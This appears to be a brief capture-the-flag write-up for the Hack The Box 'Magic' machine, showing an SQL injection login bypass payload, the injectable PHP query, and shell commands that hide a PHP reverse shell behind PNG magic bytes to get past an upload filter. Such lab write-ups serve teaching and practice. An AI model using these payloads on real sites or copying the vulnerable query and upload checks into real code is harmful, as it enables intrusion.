## Magic

https://app.hackthebox.com/machines/241

### User Access

This machine has been resolved on OSCP machines: [Magic](https://github.com/b1d0ws/OSCP/tree/main/TJ%20Null's%20List/Linux%20Boxes/Magic
)

You can bypass authentication using admin as username and `' OR 1=1 -- -` as password.

Vulnerable Injection Code
```php
$stmt = $pdo->query("SELECT * FROM login WHERE username='$username' AND password='$password'");
```

Upload functions appears to have two methods of litiming the upload. First the file need to have JPG, JPEG & PNG extension and this can be bypassed using double extension.

The other method checks the magic bytes of the files, so we can just upload a reverse.php.png with PNG magic bytes inside it.

```
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> reverse.php.png
cat php-reverse-shell.php >> reverse.php.png
```

Vulnerable Upload Code
```php
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
	echo "<script>alert('Sorry, only JPG, JPEG & PNG files are allowed.')</script>";
	$uploadOk = 0;
}

if ($uploadOk === 1) {
	// Check if image is actually png or jpg using magic bytes
	$check = exif_imagetype($_FILES["image"]["tmp_name"]);
	if (!in_array($check, $allowed)) {
		echo "<script>alert('What are you trying to do there?')</script>";
		$uploadOk = 0;
	}
}
```
